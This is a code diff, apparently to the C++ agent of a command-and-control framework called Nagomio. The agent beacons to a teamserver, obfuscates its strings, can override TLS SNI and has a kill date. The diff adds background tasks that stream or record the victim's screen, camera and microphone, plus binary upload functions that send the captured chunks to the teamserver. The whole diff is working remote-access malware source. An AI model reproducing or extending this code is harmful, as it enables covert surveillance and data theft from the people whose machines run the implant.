@@ -872,10 +872,122 @@ HttpPostResult post_json_windows(const AgentConfig& config, const std::string& e
 HttpPostResult get_json_windows(const AgentConfig& config, const std::string& endpoint) {
     return http_request_windows(config, "GET", endpoint, "");
 }
+
+HttpPostResult post_binary_windows(const AgentConfig& config, const std::string& endpoint, const std::vector<unsigned char>& body) {
+    HttpPostResult result;
+    std::wstring callback_url = utf8_to_wide(config.callback_url);
+
+    URL_COMPONENTS components{};
+    components.dwStructSize = sizeof(components);
+    components.dwSchemeLength = static_cast<DWORD>(-1);
+    components.dwHostNameLength = static_cast<DWORD>(-1);
+    components.dwUrlPathLength = static_cast<DWORD>(-1);
+    components.dwExtraInfoLength = static_cast<DWORD>(-1);
+    if (!WinHttpCrackUrl(callback_url.c_str(), static_cast<DWORD>(callback_url.size()), 0, &components)) {
+        result.error = windows_error("WinHttpCrackUrl");
+        return result;
+    }
+
+    std::wstring host(components.lpszHostName, components.dwHostNameLength);
+    std::wstring path = combine_url_path(components, endpoint);
+    bool secure = components.nScheme == INTERNET_SCHEME_HTTPS;
+
+    WinHttpHandle session(WinHttpOpen(utf8_to_wide(config.user_agent).c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0));
+    if (!session) { result.error = windows_error("WinHttpOpen"); return result; }
+
+    WinHttpHandle connection(WinHttpConnect(session, host.c_str(), components.nPort, 0));
+    if (!connection) { result.error = windows_error("WinHttpConnect"); return result; }
+
+    DWORD flags = secure ? WINHTTP_FLAG_SECURE : 0;
+    WinHttpHandle request(WinHttpOpenRequest(connection, L"POST", path.c_str(), nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags));
+    if (!request) { result.error = windows_error("WinHttpOpenRequest"); return result; }
+
+    if (secure && !config.sni_override.empty()) {
+        std::wstring sni = utf8_to_wide(config.sni_override);
+        WinHttpSetOption(request, WINHTTP_OPTION_SSL_SERVER_NAME,
+                         sni.data(), (DWORD)((sni.size() + 1) * sizeof(wchar_t)));
+    }
+
+    DWORD send_timeout = 60 * 1000;
+    DWORD receive_timeout = 60 * 1000;
+    WinHttpSetOption(request, WINHTTP_OPTION_SEND_TIMEOUT, &send_timeout, sizeof(send_timeout));
+    WinHttpSetOption(request, WINHTTP_OPTION_RECEIVE_TIMEOUT, &receive_timeout, sizeof(receive_timeout));
+
+    std::wstring headers = L"Content-Type: application/octet-stream\r\n";
+    if (!config.agent_token.empty()) {
+        auto auth = compute_auth_headers(config.agent_id, config.agent_token);
+        headers += L"x-nagomio-ts: ";
+        headers += utf8_to_wide(auth.timestamp);
+        headers += L"\r\n";
+        headers += L"x-nagomio-nonce: ";
+        headers += utf8_to_wide(auth.nonce);
+        headers += L"\r\n";
+        headers += L"x-nagomio-mac: ";
+        headers += utf8_to_wide(auth.mac);
+        headers += L"\r\n";
+    }
+
+    if (!WinHttpSendRequest(
+            request,
+            headers.c_str(),
+            static_cast<DWORD>(headers.size()),
+            const_cast<unsigned char*>(body.data()),
+            static_cast<DWORD>(body.size()),
+            static_cast<DWORD>(body.size()),
+            0)) {
+        result.error = windows_error("WinHttpSendRequest");
+        return result;
+    }
+
+    if (!WinHttpReceiveResponse(request, nullptr)) {
+        result.error = windows_error("WinHttpReceiveResponse");
+        return result;
+    }
+
+    DWORD status_code = 0;
+    DWORD status_size = sizeof(status_code);
+    if (WinHttpQueryHeaders(request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &status_code, &status_size, WINHTTP_NO_HEADER_INDEX)) {
+        result.status = static_cast<int>(status_code);
+    }
+
+    while (true) {
+        DWORD available = 0;
+        if (!WinHttpQueryDataAvailable(request, &available)) {
+            result.error = windows_error("WinHttpQueryDataAvailable");
+            return result;
+        }
+        if (available == 0) break;
+        std::string chunk(static_cast<size_t>(available), '\0');
+        DWORD read = 0;
+        if (!WinHttpReadData(request, chunk.data(), available, &read)) {
+            result.error = windows_error("WinHttpReadData");
+            return result;
+        }
+        chunk.resize(read);
+        result.body += chunk;
+    }
+
+    result.transport_ok = true;
+    return result;
+}
 #else
 HttpPostResult post_json(httplib::Client& cli, const httplib::Headers& headers, const std::string& endpoint, const std::string& body) {
     HttpPostResult result;
     if (auto res = cli.Post(endpoint, headers, body, "application/json")) {
+        result.transport_ok = true;
+        result.status = res->status;
+        result.body = res->body;
+        result.location = res->get_header_value("Location");
+    } else {
+        result.error = httplib::to_string(res.error());
+    }
+    return result;
+}
+
+HttpPostResult post_binary(httplib::Client& cli, const httplib::Headers& headers, const std::string& endpoint, const std::vector<unsigned char>& body) {
+    HttpPostResult result;
+    std::string body_str(reinterpret_cast<const char*>(body.data()), body.size());
+    if (auto res = cli.Post(endpoint, headers, body_str, "application/octet-stream")) {
         result.transport_ok = true;
         result.status = res->status;
         result.body = res->body;
@@ -1395,6 +1507,78 @@ Nagomio::AgentResponse execute_file_task(const Nagomio::Task& task, const std::s
     return agent_res;
 }
 
+// --- Background-thread runtime context -----------------------------------
+// Live stream tasks run on detached threads so the agent keeps beaconing
+// (stays "online") while the capture loop runs. Those threads need reg /
+// config / cli / headers to post the final response back to the teamserver.
+struct AgentRuntimeCtx {
+    Nagomio::AgentRegistration reg;
+    AgentConfig config;
+#ifndef _WIN32
+    httplib::Client* cli = nullptr;
+    httplib::Headers headers;
+#endif
+};
+static AgentRuntimeCtx& agent_runtime_ctx() {
+    static AgentRuntimeCtx ctx;
+    return ctx;
+}
+static const Nagomio::AgentRegistration& reg_for_thread() { return agent_runtime_ctx().reg; }
+static const AgentConfig& config_for_thread() { return agent_runtime_ctx().config; }
+#ifndef _WIN32
+static httplib::Client* cli_for_thread() { return agent_runtime_ctx().cli; }
+static httplib::Headers headers_for_thread() {
+    httplib::Headers h;
+    const auto& cfg = agent_runtime_ctx().config;
+    const auto& rg = agent_runtime_ctx().reg;
+    if (!cfg.agent_token.empty()) {
+        auto auth = compute_auth_headers(rg.agent_id, cfg.agent_token);
+        h.emplace(OBFSTR("x-nagomio-ts"), auth.timestamp);
+        h.emplace(OBFSTR("x-nagomio-nonce"), auth.nonce);
+        h.emplace(OBFSTR("x-nagomio-mac"), auth.mac);
+    }
+    h.emplace(OBFSTR("User-Agent"), cfg.user_agent);
+    return h;
+}
+#endif
+
+// Post a task response directly to the teamserver. Used by background stream
+// threads so they don't block the main beacon loop.
+static void send_agent_response(const Nagomio::AgentResponse& agent_res,
+                                const Nagomio::AgentRegistration& reg,
+                                const AgentConfig& config
+#ifndef _WIN32
+                                , httplib::Client* cli, const httplib::Headers& headers
+#endif
+) {
+    json j_res = agent_res;
+    std::string res_body = j_res.dump();
+#if NAGOMIO_WIRE_ENCRYPTION
+    if (!config.agent_token.empty()) {
+        std::vector<unsigned char> nonce, ct, tag;
+        nagomio_wire::seal(config.agent_token, "nagomio/server/v1",
+                           std::vector<unsigned char>(res_body.begin(), res_body.end()),
+                           nonce, ct, tag);
+        res_body = nagomio_wire::encode_envelope("nagomio/server/v1", nonce, ct, tag);
+    }
+#endif
+#ifndef _WIN32
+    httplib::Headers res_headers = headers;
+    if (!config.agent_token.empty()) {
+        auto auth = compute_auth_headers(reg.agent_id, config.agent_token);
+        res_headers.erase(OBFSTR("x-nagomio-ts"));
+        res_headers.erase(OBFSTR("x-nagomio-nonce"));
+        res_headers.erase(OBFSTR("x-nagomio-mac"));
+        res_headers.emplace(OBFSTR("x-nagomio-ts"), auth.timestamp);
+        res_headers.emplace(OBFSTR("x-nagomio-nonce"), auth.nonce);
+        res_headers.emplace(OBFSTR("x-nagomio-mac"), auth.mac);
+    }
+    post_json(*cli, res_headers, nagomio::response_path(), res_body);
+#else
+    post_json_windows(config, nagomio::response_path(), res_body);
+#endif
+}
+
 Nagomio::AgentResponse execute_task(const Nagomio::Task& task, const std::string& agent_id, int timeout_seconds) {
     if (task.command == OBFSTR("file_list") ||
         task.command == OBFSTR("file_download") ||
@@ -1405,10 +1589,82 @@ Nagomio::AgentResponse execute_task(const Nagomio::Task& task, const std::string
         return execute_file_task(task, agent_id);
     }
 
+    // Stream/record capture commands run in a detached background thread so
+    // the agent keeps beaconing (stays "online") while capture is active.
+    // The main thread returns an immediate started ack; the background thread
+    // runs capture and posts the final response when it ends.
+    if (task.command == OBFSTR("stream_display") ||
+        task.command == OBFSTR("stream_camera") ||
+        task.command == OBFSTR("stream_mic") ||
+        task.command == OBFSTR("record_display") ||
+        task.command == OBFSTR("record_camera") ||
+        task.command == OBFSTR("record_mic")) {
+        bool is_stream = task.command == OBFSTR("stream_display") ||
+                         task.command == OBFSTR("stream_camera") ||
+                         task.command == OBFSTR("stream_mic");
+        Nagomio::AgentResponse ack;
+        ack.agent_id = agent_id;
+        ack.task_id = task.task_id;
+        ack.status = OBFSTR("success");
+        nlohmann::json j = {
+            {"type", is_stream ? "stream_started" : "record_started"},
+            {"task_id", task.task_id},
+            {"command", task.command},
+        };
+        ack.output = j.dump();
+
+        // Capture everything the background thread needs.
+        Nagomio::Task bg_task = task;
+        std::string bg_agent = agent_id;
+        Nagomio::AgentRegistration bg_reg = reg_for_thread();
+        AgentConfig bg_config = config_for_thread();
+#ifndef _WIN32
+        httplib::Client* bg_cli = cli_for_thread();
+        httplib::Headers bg_headers = headers_for_thread();
+#endif
+        std::thread([bg_task, bg_agent, bg_reg, bg_config
+#ifndef _WIN32
+            , bg_cli, bg_headers
+#endif
+        ]() mutable {
+            nagomio_runtime::current_agent_id_ref() = bg_agent;
+            nagomio_runtime::current_task_id_ref()  = bg_task.task_id;
+            Nagomio::AgentResponse res;
+            res.agent_id = bg_agent;
+            res.task_id = bg_task.task_id;
+            try {
+                res.output = nagomio_modules::dispatch(bg_task, bg_agent);
+                res.status = OBFSTR("success");
+            } catch (const std::exception& e) {
+                res.output = e.what();
+                res.status = OBFSTR("error");
+            }
+            // If the stream was stopped via the shared flag, the stream_stop
+            // task already triggered server-side assembly, so don't send a
+            // redundant final response (it would re-assemble an empty buffer).
+            bool stopped_by_flag = false;
+            try {
+                nlohmann::json out = nlohmann::json::parse(res.output);
+                stopped_by_flag = out.value("stopped_by_flag", false);
+            } catch (...) {}
+            if (!stopped_by_flag) {
+                send_agent_response(res, bg_reg, bg_config
+#ifndef _WIN32
+                    , bg_cli, bg_headers
+#endif
+                );
+            }
+        }).detach();
+
+        return ack;
+    }
+
     if (nagomio_modules::is_known_module(task.command)) {
         Nagomio::AgentResponse agent_res;
         agent_res.agent_id = agent_id;
         agent_res.task_id = task.task_id;
+        nagomio_runtime::current_agent_id_ref() = agent_id;
+        nagomio_runtime::current_task_id_ref()  = task.task_id;
         try {
             agent_res.output = nagomio_modules::dispatch(task, agent_id);
             agent_res.status = OBFSTR("success");
@@ -1435,6 +1691,75 @@ Nagomio::AgentResponse execute_task(const Nagomio::Task& task, const std::string
 
     return agent_res;
 }
+
+namespace NagomioHttp {
+
+struct ChunkPostResult {
+    bool ok = false;
+    int status = 0;
+    std::string body;
+    std::string error;
+};
+
+struct UploadContext {
+#ifdef _WIN32
+    const AgentConfig* config = nullptr;
+#else
+    httplib::Client* cli = nullptr;
+    httplib::Headers* headers = nullptr;
+#endif
+};
+
+static UploadContext& upload_ctx() {
+    static UploadContext ctx;
+    return ctx;
+}
+
+void set_upload_context(
+#ifdef _WIN32
+    const AgentConfig* config
+#else
+    httplib::Client* cli, httplib::Headers* headers
+#endif
+) {
+    auto& ctx = upload_ctx();
+#ifdef _WIN32
+    ctx.config = config;
+#else
+    ctx.cli = cli;
+    ctx.headers = headers;
+#endif
+}
+
+ChunkPostResult post_binary(const std::string& endpoint, const std::vector<unsigned char>& body) {
+    ChunkPostResult result;
+    auto& ctx = upload_ctx();
+#ifdef _WIN32
+    if (!ctx.config) {
+        result.error = "no upload context";
+        return result;
+    }
+    auto r = post_binary_windows(*ctx.config, endpoint, body);
+    result.ok = r.transport_ok;
+    result.status = r.status;
+    result.body = r.body;
+    result.error = r.error;
+    return result;
+#else
+    if (!ctx.cli || !ctx.headers) {
+        result.error = "no upload context";
+        return result;
+    }
+    auto r = ::post_binary(*ctx.cli, *ctx.headers, endpoint, body);
+    result.ok = r.transport_ok;
+    result.status = r.status;
+    result.body = r.body;
+    result.error = r.error;
+    return result;
+#endif
+}
+
+} // namespace NagomioHttp
 
 int main(int argc, char** argv) {
 #if NAGOMIO_KILL_DATE_EPOCH > 0
@@ -1494,10 +1819,28 @@ int main(int argc, char** argv) {
                          : nagomio::active_profile().user_agent;
 #endif
 
+    // Hoisted so the upload-context accessor has a stable pointer.
+    httplib::Headers headers;
+
+    // Register a context so the stream_* modules can post binary chunks back
+    // to /api/upload/stream/<agent>/<task> without re-parsing config.
+#ifdef _WIN32
+    NagomioHttp::set_upload_context(&config);
+#else
+    NagomioHttp::set_upload_context(&cli, &headers);
+#endif
+
+    // Populate the background-thread runtime context used by live stream tasks.
+    agent_runtime_ctx().reg = reg;
+    agent_runtime_ctx().config = config;
+#ifndef _WIN32
+    agent_runtime_ctx().cli = &cli;
+#endif
+
     while (true) {
         // A4: per-request HMAC. Compute fresh on each loop iteration so
         // the teamserver's replay cache accepts every beacon.
-        httplib::Headers headers;
+        headers.clear();
         if (!config.agent_token.empty()) {
             auto auth = compute_auth_headers(reg.agent_id, config.agent_token);
             headers.emplace(OBFSTR("x-nagomio-ts"), auth.timestamp);
